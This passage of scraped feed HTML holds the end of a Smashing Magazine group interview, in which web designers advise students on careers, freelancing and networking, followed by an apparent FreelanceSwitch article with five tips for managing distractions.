career was <strong>proactively</strong> attempting to get real-world experience by doing freelance work, part time. The purpose was two-fold: to see what it was like to work with the kind of people who would become your employers once you were out of school, and to apply what you learned in class, which reinforces your education and helps you understand it hands on. You might even end up with a few portfolio pieces to show employers once you’re on the job hunt — and some money to buy those expensive classroom textbooks.</p><h3>6. What one thing do you wish you knew before starting your career?</h3><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2009/12/bulb.jpg\" alt=\"Bulb in Group Interview: Expert Advice For Students and Young Web Designers\" width=\"400\" height=\"533\"></p><h4>Darren Hoyt</h4><p>Being in touch with my limitations and skills.</p><p>The first few years of designing for the Web (1998 to 2001), I knew being cross-trained was important, so I built my skills in design and front-end code (HTML, CSS) equally. But then I made the mistake of thinking that, if I was to become a more complete designer and developer, I should learn Perl, Flash and Unix commands, too. I sucked at all of those things and kept sucking until they asked me to stop.</p><p>Deep down, I knew I wasn’t wired for any of that stuff. And more importantly, I wasn’t actually interested in it, not compared to design anyway. Employers do value someone who is cross-trained, but not if the results are mediocre.</p><h4>David Leggett</h4><p>Pleasing everyone is nearly <strong>impossible</strong>. Be friendly to those who enjoy your work and friendlier to those who attack it.</p><h4>Jacob Gube</h4><p>I wished I had realized that <strong>quality</strong> is more important than quantity. When I started out, I focused on low-cost, high-quantity jobs, which resulted in late hours, not enough pay and nothing really that I could be proud to put in my portfolio. I wanted to work with as many people and on as many projects as I could to jumpstart my experience and resume. But the Project Triangle principle applies here: I did it fast and cheap, and so the outcomes weren’t good. If I had slowed down and focused on getting gigs that were interesting and better quality, I would have progressed more fruitfully.</p><h4>Paul Boag</h4><p>That <strong>constraints</strong> are good. As a Web design student, I was given endless freedom to design how I wanted and what I wanted. However, the real world is not like that. When I joined IBM out of university, my first job was to design 8-bit icons. Very restrictive indeed. When I started on the Web, it allowed only gray backgrounds and text that was justified left, right or centred. The first time I worked on a multimedia CD, it was capable of running video at only 160 x 120 pixels.</p><p>At the time, this frustrated me massively. However, in hindsight it was enormously beneficial. It pushed me creatively, and it has also given me a lot more patience with the peculiarities of browsers such as IE6.</p><h3>7. What job search advice do you have for recent graduates?</h3><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2009/12/newspaper.jpg\" alt=\"Newspaper in Group Interview: Expert Advice For Students and Young Web Designers\" width=\"575\" height=\"366\"></p><h4>Soh Tanaka</h4><p>First and foremost, get your <strong>portfolio</strong> up, and make sure it represents your best work. If you lack work samples, start creating projects for yourself (websites for your hobbies, your family or for friends). As a new grad, you need to prove that you are serious and willing; the best way to get that message across is through a robust portfolio.</p><p>Secondly, hit the <strong>job boards</strong>, and send your resumes and cover letters to companies you would like to work for. Doing research and tailoring each cover letter and resume to the company is important. Stick to the job requirements, and follow directions carefully. These employers receive many applications daily, and nothing is worse than seeing a bland and generic introduction to who you are and what you offer. Stand out from the rest.</p><p>Thirdly, keep your <strong>networks</strong> open, and make yourself known! Networking is key.</p><h4>Darren Hoyt</h4><p>Obviously, scour the online job boards (<a href=\"http://www.authenticjobs.com/\">Authentic Jobs</a>, <a href=\"http://jobs.37signals.com/jobs\">37 Signals</a>, <a href=\"http://www.coroflot.com/public/jobs_browse.asp\">Coroflot</a>), but also follow the blogs and Twitter feeds of Web designers who you respect. Studying their methods will give you a clearer picture of the sort of designer you want to be. If you need advice, trying dropping them an email. But remember that not everyone has the free time to answer.</p><p>Truthfully, most designers I know didn’t get their job by applying cold to an agency they knew nothing about. Instead, they slowly made <strong>relationships</strong> with like-minded people until they began to see opportunities and get offers.</p><p>But I would stress, don’t “network” compulsively. It can look obvious and obnoxious and make you look needy. Instead, make connections with people you actually think you share interests with, people you could imagine being colleagues and friends, rather than business contacts. The rewards are much greater.</p><h4>Chris Coyier</h4><p>Nobody will hire you because you say you have skills. You’ll have to demonstrate your skills, so either work on your current personal website or start building one. Use the website as a portfolio and resume to send to companies. Send it both to companies that say they are hiring and to ones that don’t. Just because a Web company doesn’t hang a “Now hiring” sign on it door doesn’t mean it couldn’t use someone. Pitch them. A little advice for that portfolio: three awesome designs are better than three awesome and six mediocre designs packed in the same space. Showcase only your finest work, what you’re capable of. <strong>Quality</strong> over quantity.</p><h3>8. What should new designers consider when deciding between working for an agency and freelancing?</h3><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2009/12/desk.jpg\" alt=\"Desk in Group Interview: Expert Advice For Students and Young Web Designers\" width=\"575\" height=\"431\"></p><h4>Elliot Jay Stocks</h4><p>Jumping straight into freelancing once you’ve completed your education is really tempting. I very nearly did that myself. But I’m glad I didn’t. You learn valuable <strong>lessons</strong> working for someone else first, and it’s actually much easier because you don’t have to worry about getting clients for yourself. So, I would recommend working for someone else before going it alone. It’s a great opportunity to build up your portfolio without dealing with any of the boring stuff that goes with freelancing or running your own business. I wrote a post about this a while ago: <a href=\"http://elliotjaystocks.com/blog/build-your-profile-to-get-more-freelance-work/\">Build Your Profile to Get More Freelance Work</a>.</p><h4>Soh Tanaka</h4><p>As a new designer, being at an agency or on a team is great for <strong>learning</strong> and feeling out the industry. Though you may not be able to set your own hours or work from home, a steady pay check and health insurance are both welcome during a tough economy.</p><p>When choosing the freelance route, have some <strong>experience</strong> under your belt, and be ready to be on your own. The key factor is knowing what your skills are and having discipline. Freelancing has its ups and downs, and you must be self-motivated and determined to overcome the challenges. Working from home and setting your own hours is ideal for most, but young designers should consider the requirements and reality before diving in head first. It may be wise to freelance part time until you build enough confidence and experience and know enough about your strengths and weaknesses to be able to make the right decisions when you strike out on your own.</p><h4>Chris Spooner</h4><p>It’s always worth learning the pros and cons of working for an agency and freelancing, because each has its perks! Here are a few that spring to mind.</p><p><strong>Agency pros:</strong></p><ul><li>Working for an agency after your studies can be great for gaining experience in how the industry works and how projects are managed from start to finish.</li><li>At an agency, you work with like-minded colleagues, who you can learn from and develop with.</li><li>Large agencies often attract big corporations and established brands.</li><li>A full-time job guarantees you a monthly wage and set working hours.</li></ul><p><strong>Agency cons:</strong></p><ul><li>You might get stuck working on projects that you don’t find interesting or might have to work on something you don’t agree with.</li><li>Agencies sometimes have strict policies, rules and guidelines. For instance, browsing the Web, checking Facebook or tweeting might get you a slap on the wrist.</li><li>Agencies work during the usual 9:00 to 5:00 business hours, so you will have to as well.</li></ul><p><strong>Freelance pros:</strong></p><ul><li>As a freelancer, you have complete control of the projects you take on and the type of work you do.</li><li>You’re not tied to any particular working hours, so taking a day off is no problem.</li><li>If you can generate a consistent flow of projects, it can be much easier to earn a decent wage than you would by working at an agency.</li><li>You can work in your pyjamas!</li></ul><p><strong>Freelance cons:</strong></p><ul><li>You are personally responsible for your own income, a circumstance that can put you at risk.</li><li>Freelancers need to be able to manage their time in order to avoid distractions.</li></ul><p>I would recommend that new designers first seek out employment, which will give you professional experience with and knowledge of design. Then you’ll be able to decide whether you fit better at an agency or working for yourself.</p><p>One of the main things to consider before starting out as a freelancer is whether you’ve generated enough industry experience to be able not only to create designs but to source work, manage multiple projects and communicate with clients. These other factors definitely come into play when freelancing, so having at least some <strong>knowledge</strong> of these processes before diving in is important.</p><h3>9. How can students and young designers make themselves more valuable to potential employers?</h3><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2009/12/hire.jpg\" alt=\"Hire in Group Interview: Expert Advice For Students and Young Web Designers\" width=\"575\" height=\"431\"></p><h4>Darren Hoyt</h4><p>Start building a Web presence as early as possible, even before seeking a junior position. Buy a personal domain and set up a simple <strong>portfolio</strong>, with an “About” page that gives a snapshot of your personality and talents. If haven’t done client work, do pro bono projects for friends until you have work samples to show. Displaying them publicly shows that you have pride in your work.</p><p><strong>Be concise</strong>. Employers and human resource people are like anyone else: they are busy and have short attention spans. Don’t make them dig to find out who you are. Give your portfolio website just enough text, images and examples to paint an accurate picture. If you can’t give your own content a crisp and concise design, why should employers trust you to do that for clients?</p><p>Also, <strong>don’t exaggerate</strong> the facts when presenting yourself. Our lives are way too public these days to bother. More important than bragging or dazzling anyone with half-truths is finding a team whose needs and interests align with your own. If you get hired under false pretences, you will have wasted everyone’s time. Even experienced designers with great portfolios aren’t the right fit, disposition-wise, for every agency they apply to.</p><h4>Wolfgang Bartelme</h4><p>As I mentioned before, I’m a huge fan of the <strong>interdisciplinary</strong> approach. At most companies, you are unlikely to work exclusively in a single field. In fact, when you do Web design, being able to do some decent-looking icons or cut a simple screencast or promo video is good. This becomes even more important when you are self-employed. Moreover, this variety makes and keeps work interesting… at least that’s the case for me.</p><h4>Chris Coyier</h4><p>Just being a nice person and <strong>easy</strong> to work with is pretty huge. I think employers look for that during the interview process, at least as best they can in that short time. Someone incredibly stiff or stand-offish is unlikely to win the job over someone who is happy and casual. Design studios, in my experience, are pretty friendly and casual. Other random advice: become really good at one thing. You’ll be a lot more valuable as the guy or girl who knows that one thing really well than as a jack of all trades. Being well-rounded is awesome, but having a spike of talent in one particular area will serve you well.</p><h4>Walter Apai</h4><p><strong>Social skills</strong> are necessary when dealing with potential clients. Designers should know what their clients do and provide them with the best possible service.</p><p>I’d encourage all designers to make themselves a one-stop shop for all of their clients’ design needs. That would include Web design, copywriting, printing, etc. If you’re not an expert in these fields, <strong>team up</strong> with a few peers so that you can help each other as needed.</p><p>Designers should focus on making the entire process easy for clients, but involve clients in some design decisions as well, so that they feel that they are part of the project.</p><p>I suggest asking the clients a lot of <strong>questions</strong> and truly aiming to get to the core of their business and what would work for them. The more we understand our clients and their projects, the more successful the projects will be and the better our chances of getting them as repeat clients.</p><p>A designer is a human being, too. Become a well-versed designer, understand your medium, get educated and become a well-rounded person who always aims high.</p><p>Set <strong>high standards</strong> for yourself and your work. The right clients will gravitate to someone who holds themselves to high standards.</p><h3>10. What should new freelancers do during the first few months of their business to succeed?</h3><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2009/12/start.jpg\" alt=\"Start in Group Interview: Expert Advice For Students and Young Web Designers\" width=\"575\" height=\"383\"></p><h4>Paul Andrew</h4><p>You have to have a personal <strong>business plan</strong>. I really wish I had a plan when I started out; I really do. I jumped right in, feet first, and landed on my head! And it hurt. Partly, I think it was those first few months of hardship that even now propel me forward. That period not only affected my finances and confidence, it damaged my reputation. That is very hard to regain. I think over the years I have regained it, but it was hard work, and it all could have been avoided with a bit more planning and simply by writing a personal business strategy.</p><p>It’s not enough to have a strategy planned out in your head; it has to be on <strong>paper</strong>. You need to be able to read it and see it to live by it. Every so often you should read it again, just to realign yourself. And then read it again, and only tweak it if you really have to.</p><p>Your personal business plan could do the following:</p><ul><li>Describe your business objectives, business direction and where you hope to be in x number of months.</li><li>List all potential pitfalls and how to avoid them.</li><li>Set honest and realistic targets, and allow for a little flexibility.</li><li>As your business grows, track its efforts and compare them to your business objectives.</li><li>Set up a financial framework to measure how much your business is making or not making.</li><li>Describe how you are going to attract new business to meet your financial targets.</li></ul><p>Everyone and every business is different. Write down what is correct and <strong>achievable</strong> for you, and be very honest: it is your business after all.</p><p>Stick to the plan!</p><h4>Brian Hoff</h4><p>Personally, I worked for nearly three years while preparing to go freelance. I would work my 9:00 to 5:00 job, come home, eat dinner and then market myself (blog), search for new business, advertize and work from around 7:00 pm until 12:00 am. Having a good feel for running your own business is important before you go in head first.</p><p><strong>Saving</strong> money is also important. Every business, no matter what it is, goes through periods of drought. Having money to back you up for a little while is a must. Freelancing is not for everyone. Part-time freelancing while maintaining a steady-paying job will help you get a feel for things.</p><h4>Chris Spooner</h4><p>I think the most important time in freelancing isn’t particularly the first few months, but more so the time <strong>leading up</strong> to going freelance. As a freelancer, you’ll need a good flow of clients to generate income; you’ll have to get busy promoting and building a name for yourself, so that when you’re ready to leave your job, you’ll be all set to simply flick the switch from employment to self-employment.</p><p>During this build-up time, you’ll want to design all of your personal <strong>branding</strong>, especially your website, to showcase what you can do. Become an active member of the design community by blogging, guest writing and networking via Twitter (or you might want to network offline or locally); and begin taking on projects that you can work on during the nights. It can be hard work managing both your full-time job and one or two freelance projects simultaneously, but when the number of inquiries reaches an optimal level, you can quickly switch from your job to taking on more freelance work — rather than making the decision one day, falling flat on your face and then having to eat beans on toast until you’ve built a profile.</p><h4>Jon Phillips</h4><p>I believe the first few months are crucial, especially because it usually means quitting the day job and taking the plunge into the freelancing world. It can be scary at first. Many things need to be done in the first few months, but of course nothing is irreparable. Should you make a bad decision, you can always fix things as you go along. I highly recommend getting a <strong>portfolio</strong> website up; even if you don’t have a lot to show, you need a place to showcase what you have. Then get a good invoicing system such as <a href=\"http://www.freshbooks.com/\">Freshbooks</a> or <a href=\"http://www.billingsapp.com/\">Billings 3</a>, network with other freelancers as much as possible via Twitter, Facebook, design forums and blogs and maybe start a blog of your own.</p><h4>Elliot Jay Stocks</h4><p>Work for someone else! For the first few months to be a success, you need to have work lined up, so having that in place before you make the jump is important. I’d also recommend getting a good <strong>accountant</strong> as soon as you can and some sort of system for keeping track of your money, such as <a href=\"http://www.xero.com/\">Xero</a>. Also, make sure you have a website set up long before you decide to go solo.</p><h3>11. Aside from design and technical skills, what aspects of running a business should new freelancers focus on?</h3><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2009/12/graph.jpg\" alt=\"Graph in Group Interview: Expert Advice For Students and Young Web Designers\" width=\"575\" height=\"325\"></p><h4>Paul Andrew</h4><p>The advice I have been given over the years about freelancing as a business has varied. Some have told me that putting business ahead of design guarantees profit and keeps your head above water. On the other hand, I have also been told not to treat design as a business, to work on what your passion is, and the business side will take care of itself.</p><p>These are both great philosophies, but they don’t really work in the real world. The answer is to have a healthy <strong>balance</strong> between the two. Both need to be kept apart while at the same time working off each other. Think of it as the positive and negative charge of a battery. The battery only works when both charges are connected. (You can decide which is the positive and negative side in relation to business and design).</p><p>When meeting potential clients, first impressions really do count, and you really need to present yourself with <strong>professionalism</strong>. It does not matter how strong your portfolio is or who you are — it is about how professional and business-like you appear to them. You are negotiating a business transaction after all.</p><p>Yes, this means breaking away from the designer stereotype of wearing t-shirts and jeans and instead being clean shaven, putting on a business suit and remembering the manners your mother taught you. Carry business cards with you, maybe even a briefcase; do what you have to do to convince the client you mean business.</p><p>Some monkeys you should not carry on your back by yourself, and they are the finance side of your business. Let’s be honest: who understands tax and monetary law. I certainly don’t and don’t care to either. Find yourself an accountant. They don’t cost that much — maybe a week’s wage out of the year, and when you weigh the cost of doing your taxes incorrectly and the penalties that might follow, an <strong>accountant</strong> is a worthwhile investment.</p><p>It would be nice if everyone you worked with was honest. Protecting the integrity of your work, yourself and your business should be next on your to-do list. The reality is that at some point, someone will try to shortchange you or, worse, wiggle out of a payment. That is why you need a watertight contract. Every country has its own laws regarding design; make sure you know and understand yours.</p><p>Hiring a lawyer to write a standard <strong>contract</strong> for your small business would be expensive. A way around this would be to write your own, as I did. I asked a few designers for advice and researched the law online and came up with an outline for my own. I then took it to a lawyer and asked them to sanity-check it. Not as expensive as asking them to write it — still, it wasn’t cheap, but it was worth it.</p><p>So, to sum up, if you’re dressed smart, your business finances are in safe hands and you are legally protected, you are now free to do what you were trained to do and give your creativity free reign, letting your passion fuel your design. It is a long road to take, but it is necessary.</p><h4>Brian Hoff</h4><p><strong>Marketing</strong> without a doubt. I receive many emails asking how I get so much freelance business or how do I find clients. My response: You have to work hard for it. Clients won’t come to you. Tell everyone what you do, start a blog, attend networking events and conferences, contact clients directly. Running your own business is hard work. There is no such thing as a 40-hour work week when you run your own business. I work seven days a week. I’ve even gone so far as to strike up new work by chatting with someone at the bar (not recommended). You have to have personality and drive to freelance successfully.</p><h4>Jon Phillips</h4><p>Being a freelancer means having to wear many different hats (a ton of different hats!). Spending some time on government websites and meeting with an <strong>accountant</strong> to learn more about tax laws goes a very long way. Of course, many designers, being creative types, tend to forget that it’s a business (I often forget). You need to spend time on accounting but also on networking and marketing your business. In the first few months results will be small, but your efforts will pay off in the long run. You need to be as good with numbers as you are with Photoshop.</p><h3>12. What are some of the best ways for new designers to find clients?</h3><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2009/12/people.jpg\" alt=\"People in Group Interview: Expert Advice For Students and Young Web Designers\" width=\"575\" height=\"431\"></p><h4>Henry Jones</h4><p>I can only speak from experience here. Shortly before I went full-time freelancing, my <strong>portfolio</strong> was listed on several popular CSS galleries. From that point on, clients found me. I was very surprised to see how many people used the galleries to find designers. Once I had a few clients and projects under my belt, I started to get a lot of referrals. So, work hard on creating a great portfolio, and use the design galleries. This is probably the best and easiest way to get the most exposure. Plenty of design-specific job boards are available, such as <a href=\"http://www.authenticjobs.com/\">AuthenticJobs</a>, where you can search for projects that are a good fit for you.</p><h4>Jon Phillips</h4><p>I think websites such as <strong>Twitter</strong> are a great place to get started! In fact, I found a lot of my own clients via Twitter. Design forums are also a great place to network, make friends and find work. New freelancers may also be tempted to try design contests and crowd-sourcing, but I personally think they devalue the industry, so I wouldn’t advise doing that. Even if you don’t have much to show in your portfolio, there are others ways to get gigs. There are always job boards, such as <a href=\"http://jobs.smashingmagazine.com/\">the one on Smashing Magazine</a> and <a href=\"http://jobs.freelanceswitch.com/\">the one on FreelanceSwitch</a>, which are great for finding clients. You might even consider buying banner ads on design-related websites. But your marketing budget may not allow this at first, so networking websites, job boards and forums would be the places to hang out.</p><h4>Jacob Cass</h4><p>Get your name out there. Start <strong>blogging</strong>. Showcase your work. Look on job boards. Ask friends, family, local charities. Read books and blog posts: the information is out there. Your job is to find it!</p><h4>Walter Apai</h4><p><strong>Networking</strong> is one of the best ways but often one of the most overlooked ones. I suggest that new designers speak to everyone they know and use every chance they have to talk about their work and what they do for a living.</p><p>I found myself just mentioning Web design to someone the other day (not even looking for more work), and immediately they thought of someone they knew who was looking for a website redesign. Opportunities are everywhere; just seize them.</p><p>I should also mention that one should not rely on networking alone or any other single “system.” I’d encourage new designers to take a <strong>multi-faceted</strong> approach to their new career.</p><p>There are unlimited ways to get new clients. Posting on bulletin boards, both online and offline, and placing small ads in the newspaper or local magazines are just a few of the media you can use. I also think that starting local is best, and getting experience working on projects with people who you can meet in person in your own city. This is a good starting point to gain more “field” experience.</p><h4>Paul Boag</h4><p>It has to start with <strong>friends</strong> and <strong>family</strong>. This will help build your initial portfolio. From there, consider doing some discounted work for a local charity to gain experience in working for real clients. After that, the contacts you have made through networking will start to pay off, and hopefully you will get some work through them. Finally and most importantly, make it known that you want work. It is surprising how many freelance websites I visit that don’t state whether they currently accept work or not.</p><p>That said, I would suggest that if you are straight out of university, you should probably work for a small agency before jumping into the freelance world. Being a freelancer requires a lot of business skills that they don’t teach you in university.</p><h3>13. What networking tips do you have for young designers?</h3><h4>Henry Jones</h4><p>One option is to attend design conferences, but for young designers this can be expensive. So, I would recommend getting involved in the design <strong>community</strong>. Start reading and leaving comments on popular design blogs. Create a Twitter account, and post useful stuff. Depending on how much time you have, you could even start your own design-related blog. Blogging has been huge for me, and I believe it’s the best way to get your name out there and meet other designers. No matter what route you take, just remember to be helpful and genuine, and you will build lasting relationships.</p><h4>Paul Andrew</h4><p>You are young — you cannot change that fact — and you want to be successful. In any business, especially ours, you need friends, you need contacts and most importantly you need to build professional relationships. Bear in mind, though, that networking is not something you can rush; it takes time and patience.</p><p>The best time to start networking is right <strong>now</strong>. Even if you are still in high school or haven’t yet graduated college, reach out now. It is never too early to get your name out there. Your name is your most powerful and memorable asset. Work will follow, I promise.</p><p>The most important relationships for any designer are the ones they have built with fellow students. No matter what happens, they are your primary network. You can help each other by sharing knowledge and design contacts and by learning from each other.</p><p>The best way to network beyond your inner circle is to get in touch with seasoned designers. For the most part, designers are pretty selfless and love to share and help when they can. With that in mind, put together a list of designers on whom you want to model yourself and someone with a strong body of work. Send them emails, accompanied by your portfolio, stating that you are a young designer starting out and seeking a little <strong>advice</strong>. Ask them how they got started, and ask for any tips they might be willing to share? Seasoned designers need to build their networks, too, and will welcome your introduction and questions.</p><p>When I started out as a designer, I sent a letter (with my portfolio and business card) to a local design agency — certainly not the biggest one or the most prestigious — and introduced myself as a young designer who was eager to learn. I asked if I could come in for a day or two to learn a bit about the design business and gain some work experience. Thankfully, they consented, and I spent three days asking questions, picking up business cards and meeting clients. That was over ten years ago, and I still rely on those contacts now. And to this day, that has been my most productive and successful period of networking.</p><p>Not every design agency will be as open as that one was, but I would try. There is no harm in asking.</p><p>One thing to remember about networking is that success is determined not by your number of contacts but by the <strong>quality</strong> of those contacts. Even if the best designer in the world sent you a courtesy email reply, it does not mean that you are in their network or that they are in yours. A quality network contact is someone who gives you a personal reply and genuinely tries to help you. These are the contacts you must maintain. This is your network.</p><p>Finally, please don’t think of youth as an impediment. Think of it as a license to ask questions, to learn and expand your personal network.</p><h4>Paul Boag</h4><p>Step away from the computer. Meeting people online is great, but nothing beats meeting them face to face. Attend conferences and meet-ups and get to know people. <em>Then</em> follow up on those relationships via Twitter and Facebook.</p><p>Also, don’t have an agenda. Or, if you have one, be honest and open about it. Too many people network solely to win work or become a “Web celebrity.” Instead, network because you want to meet like-minded people who will inspire and excite you about your work.</p><h4>Soh Tanaka</h4><p>Attend industry events, seminars and any kind of social gatherings. <strong>Don’t be shy</strong>; get to know the people around you. Be interested and willing to learn from them, and at the right time let them know who you are and what you do. Carry business cards with you at all times, and have your elevator speech ready. You never know when you will run into a potential client or employer. Networking is all about expanding your opportunities, and as a designer this skill is critical.</p><h3>Related posts</h3><p>You may be interested in the following related post:</p><ul><li><a href=\"http://www.smashingmagazine.com/2007/04/20/35-designers-x-5-questions/\">35 Designers x 5 Questions</a><br> Professional suggestions, tips and ideas from some of the best web-developers all around the world.</li></ul><p><em>(al)</em></p><hr><p><small>© stevensnell for <a href=\"http://www.smashingmagazine.com\">Smashing Magazine</a>, 2010. | <a href=\"http://www.smashingmagazine.com/2010/02/17/group-interview-advice-for-students-and-new-designers/\">Permalink</a> | <a href=\"http://www.smashingmagazine.com/2010/02/17/group-interview-advice-for-students-and-new-designers/#comments\">103 comments</a> | <a title=\"Bookmark in del.icio.us\" href=\"http://del.icio.us/post?url=http://www.smashingmagazine.com/2010/02/17/group-interview-advice-for-students-and-new-designers/&amp;title=Group%20Interview:%20Expert%20Advice%20For%20Students%20and%20Young%20Web%20Designers\">Add to del.icio.us</a> | <a title=\"Bookmark in Digg\" href=\"http://digg.com/submit?phase=2&amp;url=http://www.smashingmagazine.com/2010/02/17/group-interview-advice-for-students-and-new-designers/\">Digg this</a> | <a title=\"Stumble on StumbleUpon\" href=\"http://www.stumbleupon.com/submit?url=http://www.smashingmagazine.com/2010/02/17/group-interview-advice-for-students-and-new-designers/\">Stumble on StumbleUpon!</a> | <a title=\"Tweet us!\" href=\"http://twitter.com/home?status=@tweetmeme%20@smashingmag%20Reading%20&#39;Group%20Interview:%20Expert%20Advice%20For%20Students%20and%20Young%20Web%20Designers&#39;%20http://www.smashingmagazine.com/2010/02/17/group-interview-advice-for-students-and-new-designers/\">Tweet it!</a> | <a title=\"Bookmark in Reddit\" href=\"http://reddit.com/submit?url=http://www.smashingmagazine.com/2010/02/17/group-interview-advice-for-students-and-new-designers/\">Submit to Reddit</a> | <a href=\"http://forum.smashingmagazine.com/\">Forum Smashing Magazine</a><br> Post tags: <a href=\"http://www.smashingmagazine.com/tag/clients/\" rel=\"tag\">clients</a>, <a href=\"http://www.smashingmagazine.com/tag/designers/\" rel=\"tag\">designers</a>, <a href=\"http://www.smashingmagazine.com/tag/intrerviews/\" rel=\"tag\">intrerviews</a><br> </small></p>"

Then you saw the link to this article and figured that reading about how to manage distractions would be a good thing to know. Hot Suzy in a basket of muffins, you’re distracted!</p><p><span></span>It’s okay. We all get distracted sometimes. The difference between you and all the other people who get distracted easily is that you won’t continue to be distracted. You’ll read the five tips below and leave a brief comment telling me which tip you plan on implementing as you go back to your work. Would that we all could be so focused!</p><p>But we aren’t. The best we can hope to do is manage our distractions so they don’t gnaw at our productivity. Here are five tips to help you harness the distraction beast and get more productivity out of your day:</p><h2>1. Schedule Breaks</h2><p>The moments you spend away from you work are just as much a part of your life as those spent toiling away. Treat them as such! Scheduling breaks, especially when you’re short on time and long on work, can make the difference between productive success and burnout.</p><ul><li><strong>Don’t wait until you’re frazzled</strong> – Schedule your breaks, no matter how brief they may be, as a way of “topping off” your energy reserves instead of a way to come back from an empty tank.</li><li><strong>Stay on schedule</strong> – If you planned to take a 15-minute break at 12:00, you’d better be backing away from your desk by 12:01! The same goes for ending your breaks. Stay on time and you’ll find it easier to move in and out of your focused work mode without losing forward motion.</li><li><strong>A break should be a restorative action</strong> – Chatting with a friend online about your project isn’t a break. It’s a distraction. The idea of a break isn’t to derail your train of thought but to pause for restoration and refueling.</li></ul><h2>2. Plan for Distractions</h2><p>There will always be the call you must take, a fire alarm in your building, or an inexplicably suicidal pet. Interruptions happen. These simple steps will help you handle interruptions without losing too much forward motion:</p><ol><li><strong>Acknowledge the interruption</strong> – The best interruptions are the ones we see coming. The worst tend to open our door without knocking and spill coffee all over important papers. No matter the interruption, it’s not worth your time to get annoyed. Doing so will just make it that much harder to return to work once the interruption is over.</li><li><strong>Bookmark your idea – </strong>In the moments after the phone rings for the first time or you’ve said “come in” to the person knocking on your office door, you have a chance to note exactly where you were heading with your project. Part of planning for interruptions is to have sticky notes or a favorite bit of software open in order to jot a quick note before the phone rings a 3rd time or your depressed cat jumps off the balcony.</li><li><strong>Minimize your immediate involvement</strong> – Many interruptions require more than just an answer. Clients, partners, spouses, and friends typically want an action and not just a conversation. The trick to staying productive in spite of the interruption is to schedule your action for a later time. If your friend needs your feedback on a project, say you’ll be glad to give it in 20 minutes once you’ve wrapped up your own project. Follow through with quality and others will respect you for setting boundaries.</li></ol><h2>3. Regulate Inputs</h2><p>It makes you feel more relevant and connected to be “plugged in” at every moment of the day. It’s fun to have an average email response time in the single digits. But at what cost? Forget about the memories and happy moments you miss out on because you’re staring at a screen or answering a call. What about all the ideas you never have because you just don’t take time to think?</p><ul><li>Silence your Blackberry (iPhone) and put it out of sight.</li><li>Schedule phone calls so you have at least an hour of complete silence each day.</li><li>Limit the number of times you check your email each day and batch your replies when possible.</li><li>If you need to use Facebook or Twitter, do so as part of your scheduled breaks. There’s no need to let a bored shopkeeper from Siberia mess up your groove by sending you mean tweets!</li></ul><h2>4. Know Your Productive Zone</h2><p>When do you get your best work done? Are you a genius in the morning but slow in the afternoon? Do you work best late at night when you’re alone? Most of us only have a few hours each day that we can honestly point to as being truly productive hours. Those hours are what I call a “productive zone.” (I do my best writing in the early afternoon once I’ve had a cup of strong tea.) It can take some time to figure out what works best, but once you do? Guard that time with a ferocity put to use. If you know yourself to be productive under specific circumstances and can communicate the importance of those circumstances to others, there’s a good chance your requests will fall on welcoming ears.</p><h2>5. Increase Your Margins</h2><p>One of the most annoying things about interruptions is that we almost never have time for them. In our rush to get projects done at the last minute and force ideas under pressure, we miss out on numerous fun conversations and inspirational moments. If you give yourself enough time to complete projects at a high quality and allow for a few interruptions and restorative actions (breaks) you won’t find interruptions as distracting. You’ll have scheduled them, after all.</p><p>And that, dear reader, is what one might call a productive distraction. Best of luck in the rest of your day’s work. Don’t forget to share the link to this article with a friend. Being distracted alone just isn’t any fun!</p> <p><iframe src=\"http://feedads.g.doubleclick.net/~ah/f/8ht4n8gk25l2l5maofrf5p08g4/300/250?ca=1&amp;fh=280#http%3A%2F%2Ffreelanceswitch.com%2Fproductivity%2F5-ways-to-manage-distractions-for-increased-productivity%2F\" width=\"100%\" height=\"280\" frameborder=\"0\" scrolling=\"no\" marginwidth=\"0\" marginheight=\"0\"></iframe></p><div>\n<a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=db2cv6bzSDY:bADuFvx1w3w:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=db2cv6bzSDY:bADuFvx1w3w:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?i=db2cv6bzSDY:bADuFvx1w3w:V_sGLiPBpWU\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=db2cv6bzSDY:bADuFvx1w3w:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?i=db2cv6bzSDY:bADuFvx1w3w:gIN9vFwOqvQ\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=db2cv6bzSDY:bADuFvx1w3w:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?i=db2cv6bzSDY:bADuFvx1w3w:F7zBnMyn0Lo\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=db2cv6bzSDY:bADuFvx1w3w:wF9xT3WuBAs\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?i=db2cv6bzSDY:bADuFvx1w3w:wF9xT3WuBAs\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=db2cv6bzSDY:bADuFvx1w3w:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?i=db2cv6bzSDY:bADuFvx1w3w:D7DqB2pKExk\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/FreelanceSwitch/~4/db2cv6bzSDY\" height=\"1\" width=\"1\">"

